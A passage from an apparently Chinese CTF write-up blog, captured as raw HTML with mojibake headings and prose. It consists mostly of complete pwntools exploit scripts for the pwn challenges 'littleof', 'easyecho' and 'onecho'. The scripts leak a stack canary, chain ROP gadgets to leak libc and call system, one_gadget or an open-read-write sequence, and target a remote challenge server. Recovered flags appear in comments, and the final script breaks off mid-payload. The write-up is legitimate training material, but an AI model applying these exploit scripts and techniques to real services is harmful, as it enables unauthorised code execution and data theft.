class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">SigreturnFrame(kernel = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./littleof&quot;</span></span><br><span class="line"><span class="comment">#libc.so = &quot;./libc-2.24.so&quot;</span></span><br><span class="line"><span class="comment">#libc.so = &quot;&quot;</span></span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> s:p.send(s)</span><br><span class="line">sl = <span class="keyword">lambda</span> s:p.sendline(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sa = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#libcsearcher use</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">malloc_hook = main_arena-0x10</span></span><br><span class="line"><span class="string">obj = LibcSearcher(&quot;__malloc_hook&quot;, malloc_hook)</span></span><br><span class="line"><span class="string">obj = LibcSearcher(&quot;fgets&quot;, 0Xd90)</span></span><br><span class="line"><span class="string">libc_base = fgets-obj.dump(&#x27;fgets&#x27;)</span></span><br><span class="line"><span class="string">system_addr = libc_base + obj.dump(&quot;system&quot;)        #system</span></span><br><span class="line"><span class="string">binsh_addr = libc_base + obj.dump(&quot;str_bin_sh&quot;)</span></span><br><span class="line"><span class="string">log.info(&quot;system_addr:0x%x&quot;%system_addr)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#malloc_hook,main_aren Find</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">python2 LibcOffset.py libc-2.23.so</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#without stripped</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">puts_got = elf.got[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">puts_plt = elf.plt[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">system_plt = elf.plt[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">read_plt = elf.plt[&#x27;read&#x27;]</span></span><br><span class="line"><span class="string">main_addr = elf.sym[&#x27;main&#x27;]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(binary)</span><br><span class="line">    <span class="comment">#p = process([&#x27;/glibc/2.24/64/lib/ld-linux-x86-64.so.2&#x27;, &#x27;./hello&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;/glibc/2.24/64/lib/libc-2.24.so&quot;&#125;)</span></span><br><span class="line">    elf = ELF(binary)</span><br><span class="line">    <span class="comment">#libc = ELF(libc.so)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;182.116.62.85&quot;</span>,<span class="string">&quot;27056&quot;</span>)</span><br><span class="line">    elf = ELF(binary)</span><br><span class="line">    <span class="comment">#libc = ELF(libc.so)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x400789</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x400863</span></span><br><span class="line">ret = <span class="number">0x400864</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&quot;&quot;</span></span><br><span class="line">payload1 += <span class="string">&quot;A&quot;</span>*(<span class="number">0x50</span>-<span class="number">0x8</span>)</span><br><span class="line">payload1 += <span class="string">&quot;\x01&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Do you know how to do buffer overflow?\n&quot;</span>)</span><br><span class="line">sd(payload1)</span><br><span class="line">ru(<span class="string">&quot;A&quot;</span>*(<span class="number">0x50</span>-<span class="number">0x8</span>))</span><br><span class="line">canary = u64(rc(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x1</span></span><br><span class="line">log.info(<span class="string">&quot;canary:0x%x&quot;</span>%canary)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&quot;&quot;</span></span><br><span class="line">payload2 += <span class="string">&quot;A&quot;</span>*(<span class="number">0x50</span>-<span class="number">0x8</span>)</span><br><span class="line">payload2 += p64(canary)</span><br><span class="line">payload2 += <span class="string">&quot;A&quot;</span>*(<span class="number">0x8</span>)</span><br><span class="line">payload2 += p64(pop_rdi_ret)</span><br><span class="line">payload2 += p64(puts_got)</span><br><span class="line">payload2 += p64(puts_plt)</span><br><span class="line">payload2 += p64(main_addr)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">sd(payload2)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">ru(<span class="string">&quot;I hope you win\n&quot;</span>)</span><br><span class="line">puts_addr = u64(rc(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;puts_addr:0x%x&quot;</span>%puts_addr)</span><br><span class="line"></span><br><span class="line">obj = LibcSearcher(<span class="string">&quot;puts&quot;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - obj.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + obj.dump(<span class="string">&quot;system&quot;</span>)        <span class="comment">#system</span></span><br><span class="line">binsh_addr = libc_base + obj.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">one_gadget = libc_base + <span class="number">0x10a41c</span></span><br><span class="line">log.info(<span class="string">&quot;system_addr:0x%x&quot;</span>%system_addr)</span><br><span class="line">log.info(<span class="string">&quot;binsh_addr:0x%x&quot;</span>%binsh_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;A&quot;</span>*(<span class="number">0x50</span>-<span class="number">0x8</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += <span class="string">&quot;A&quot;</span>*(<span class="number">0x8</span>)</span><br><span class="line">payload += p64(one_gadget)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">payload += p64(main_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Do you know how to do buffer overflow?\n&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;A&quot;</span>*<span class="number">8</span>)</span><br><span class="line">ru(<span class="string">&quot;Try harder!&quot;</span>)</span><br><span class="line">sd(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;3c011eeb10d8b8256d4eeb1a700262d3&#125;</span></span><br></pre></td></tr></table></div></figure>




        <h1 id="ä¸‰ã€easyecho"   >
          <a href="#ä¸‰ã€easyecho" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸‰ã€easyecho" class="headerlink" title="ä¸‰ã€easyecho"></a>ä¸‰ã€easyecho</h1>
      <p>åˆ©ç”¨canaryçš„æœºåˆ¶ï¼Œæ£€æµ‹åˆ°canaryè¢«ç¯¡æ”¹æ—¶ï¼Œä¼šæ‰“å°ç¨‹åºçš„åå­—ï¼Œè€Œç¨‹åºçš„åå­—åœ¨æœ€å¼€å§‹å°±è¢«æ”¾åˆ°æ ˆä¸Šï¼Œå¯ä»¥é€šè¿‡æº¢å‡ºä¿®æ”¹åˆ°è¯¥åœ°å€ã€‚ç„¶åbackdoorä¹‹åï¼ŒæŠŠåŸæœ¬æŒ‡å‘ç¨‹åºåå­—çš„å­—ç¬¦ä¸²æŒ‡é’ˆï¼Œæ”¹ä¸ºæŒ‡å‘flagçš„æŒ‡é’ˆå³å¯ã€‚</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">SigreturnFrame(kernel = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./easyecho&quot;</span></span><br><span class="line"><span class="comment">#libc.so = &quot;./libc-2.24.so&quot;</span></span><br><span class="line"><span class="comment">#libc.so = &quot;&quot;</span></span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> s:p.send(s)</span><br><span class="line">sl = <span class="keyword">lambda</span> s:p.sendline(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sa = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#libcsearcher use</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">malloc_hook = main_arena-0x10</span></span><br><span class="line"><span class="string">obj = LibcSearcher(&quot;__malloc_hook&quot;, malloc_hook)</span></span><br><span class="line"><span class="string">obj = LibcSearcher(&quot;fgets&quot;, 0Xd90)</span></span><br><span class="line"><span class="string">libc_base = fgets-obj.dump(&#x27;fgets&#x27;)</span></span><br><span class="line"><span class="string">system_addr = libc_base + obj.dump(&quot;system&quot;)        #system</span></span><br><span class="line"><span class="string">binsh_addr = libc_base + obj.dump(&quot;str_bin_sh&quot;)</span></span><br><span class="line"><span class="string">log.info(&quot;system_addr:0x%x&quot;%system_addr)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#malloc_hook,main_aren Find</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">python2 LibcOffset.py libc-2.23.so</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#without stripped</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">puts_got = elf.got[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">puts_plt = elf.plt[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">system_plt = elf.plt[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">read_plt = elf.plt[&#x27;read&#x27;]</span></span><br><span class="line"><span class="string">main_addr = elf.sym[&#x27;main&#x27;]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lg</span>(<span class="params">string,addr</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\033[1;31;40m%20s--&gt;0x%x\033[0m&#x27;</span>%(string,addr))</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(binary)</span><br><span class="line">    <span class="comment">#p = process([&#x27;/glibc/2.24/64/lib/ld-linux-x86-64.so.2&#x27;, &#x27;./hello&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;/glibc/2.24/64/lib/libc-2.24.so&quot;&#125;)</span></span><br><span class="line">    elf = ELF(binary)</span><br><span class="line">    <span class="comment">#libc = ELF(libc.so)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;182.116.62.85&quot;</span>,<span class="string">&quot;24842&quot;</span>)</span><br><span class="line">    elf = ELF(binary)</span><br><span class="line">    <span class="comment">#libc = ELF(libc.so)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Name: &quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">ru(<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">elfbase=u64(rc(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0xcf0</span></span><br><span class="line">lg(<span class="string">&#x27;elfbase&#x27;</span>,elfbase)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Input: &quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;backdoor&quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;Input: &quot;</span>)</span><br><span class="line">sl(<span class="number">0x2D</span>*<span class="string">&#x27;PIG007NB&#x27;</span>+p64(elfbase+<span class="number">0x202040</span>))</span><br><span class="line">ru(<span class="string">&quot;Input: &quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;exitexit&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;11dc27eed9e5277915c1dfd28992812b&#125;</span></span><br></pre></td></tr></table></div></figure>


        <h1 id="å››ã€onecho"   >
          <a href="#å››ã€onecho" class="heading-link"><i class="fas fa-link"></i></a><a href="#å››ã€onecho" class="headerlink" title="å››ã€onecho"></a>å››ã€onecho</h1>
      <p>32ä½æ ˆæº¢å‡ºåŠ ORWï¼Œè¦ä¹ˆæ³„éœ²æ ˆåœ°å€ï¼Œç„¶åopenæ‰“å¼€æ ˆä¸Šçš„flagæŒ‡é’ˆï¼Œæˆ–è€…å†è¯»å–ï¼Œå°†flagå­—ç¬¦ä¸²è¯»å–åˆ°ä¸€ä¸ªå¯è¯»å¯å†™çš„åœ°æ–¹ï¼Œè¿™é‡Œå¯ä»¥é€‰æ‹©malloc_hookæˆ–è€…free_hookã€‚æ­¤å¤–é€šè¿‡environæ³„éœ²æ ˆåœ°å€ï¼Œä»æ ˆä¸Šè·å–flagå­—ç¬¦ä¸²æŒ‡é’ˆä¹Ÿæ˜¯å¯ä»¥çš„ã€‚</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">SigreturnFrame(kernel = <span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./onecho&quot;</span></span><br><span class="line">context.binary = binary</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="comment">#elf = ELF(binary)</span></span><br><span class="line">context.timeout = <span class="number">0.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(binary)</span><br><span class="line">    <span class="comment">#p = process([&#x27;/glibc/2.24/64/lib/ld-linux-x86-64.so.2&#x27;, &#x27;./hello&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;/glibc/2.24/64/lib/libc-2.24.so&quot;&#125;)</span></span><br><span class="line">    elf = ELF(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;182.116.62.85&quot;</span>,<span class="string">&quot;24143&quot;</span>)</span><br><span class="line">    elf = ELF(binary)</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> s:p.send(s)</span><br><span class="line">sl = <span class="keyword">lambda</span> s:p.sendline(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sa = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">u64Leakbase = <span class="keyword">lambda</span> offset :u64(ru(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>: ] + <span class="string">&#x27;\0\0&#x27;</span>) - offset</span><br><span class="line">u32Leakbase = <span class="keyword">lambda</span> offset :u32(ru(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>: ]) - offset</span><br><span class="line">it      = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line"></span><br><span class="line">menu = <span class="string">&quot;your choice&gt;&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dockerDbg</span>():</span></span><br><span class="line">	myGdb = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">30001</span>)</span><br><span class="line">	myGdb.close()</span><br><span class="line">	pause()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	pause()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lg</span>(<span class="params">string,addr</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\033[1;31;40m%20s--&gt;0x%x\033[0m&#x27;</span>%(string,addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>():</span></span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Give me your choice : &#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x0804973F</span></span><br><span class="line"><span class="comment">#pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line">pop_ebx_esi_edi_ebp_ret=<span class="number">0x08049810</span></span><br><span class="line">ru(<span class="string">&#x27;Input your name:&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">payload=<span class="number">0x22</span>*<span class="string">&#x27;PIG007NB&#x27;</span></span><br><span class="line">payload += p32(pop_ebx_esi_edi_ebp_ret)</span><br><span class="line">payload += p32(<span class="number">1</span>)*<span class="number">4</span></span><br><span class="line">payload += p32(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p32(main_addr)</span><br><span class="line">payload += p32(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"></span><br><span class="line">sl(payload)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">puts_addr = u32(ru(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line">obj = LibcSearcher(<span class="string">&quot;puts&quot;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr-obj.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">malloc_hook_addr = libc_base + obj.dump(<span class="string">&quot;__malloc_hook&quot;</span>)</span><br><span class="line">free_hook_addr = libc_base + obj.dump(<span class="string">&quot;__free_hook&quot;</span>)</span><br><span class="line">read_addr  = libc_base + obj.dump(<span class="string">&quot;read&quot;</span>)</span><br><span class="line">open_addr  = libc_base + obj.dump(<span class="string">&quot;open&quot;</span>)</span><br><span class="line">write_addr  = libc_base + obj.dump(<span class="string">&quot;write&quot;</span>)</span><br><span class="line">lg(<span class="string">&#x27;__malloc_hook&#x27;</span>,malloc_hook_addr)</span><br><span class="line">lg(<span class="string">&#x27;free_hook_addr&#x27;</span>,free_hook_addr)</span><br><span class="line">lg(<span class="string">&#x27;read_addr&#x27;</span>,read_addr)</span><br><span class="line">lg(<span class="string">&#x27;open_addr&#x27;</span>,open_addr)</span><br><span class="line">lg(<span class="string">&#x27;write_addr&#x27;</span>,write_addr)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;Input your name:&#x27;</span>)</span><br><span class="line">payload=<span class="number">0x22</span>*<span class="string">&#x27;PIG007NB&#x27;</span></span><br><span class="line">payload += p32(pop_ebx_esi_edi_ebp_ret)</span><br><span class="line">payload += p32(<span class="number">1</span>)*<span class="number">4</span></span><br><span class="line">payload += p32(read_addr)</span><br><span class="line">payload += p32(main_addr)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0x0804C000</span>)</span><br><span class="line">payload += p32(<span class="number">0x6</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&#x27;flag\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;Input your name:&#x27;</span>)</span><br><span class="line">payload=<span class="number">0x22</span>*<span class="string">&#x27;PIG007NB&#x27;</span></span><br><span class="line">payload += p32(pop_ebx_esi_edi_ebp_ret)</span><br><span class="line">payload += p32(<span class="number">1</span>)*<span class="number">4</span></span><br><span class="line">payload += p32(open_addr)</span><br><span class="line">payload += p32(main_addr)</span><br><span class="line">payload += p32(<span class="number">0x0804C000</span>)</span><br><span class="line">payload += p32(<span class="number">2</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;Input your name:&#x27;</span>)</span><br><span class="line">payload=<span class="number">0x22</span>*<span class="string">&#x27;PIG007NB&#x27;</span></span><br><span class="line">payload += p32(pop_ebx_esi_edi_ebp_ret)</span><br><span class="line">payload += p32(<span class="number">1</span>)*<span class="number">4</span></span><br><span class="line">payload += p32(read_addr)</span><br><span class="line">payload += p32(main_addr)</span><br><span class="line">payload += p32(<span class="number">3</span>)</span><br><span class="line">payload += p32(free_hook_addr)</span><br><span 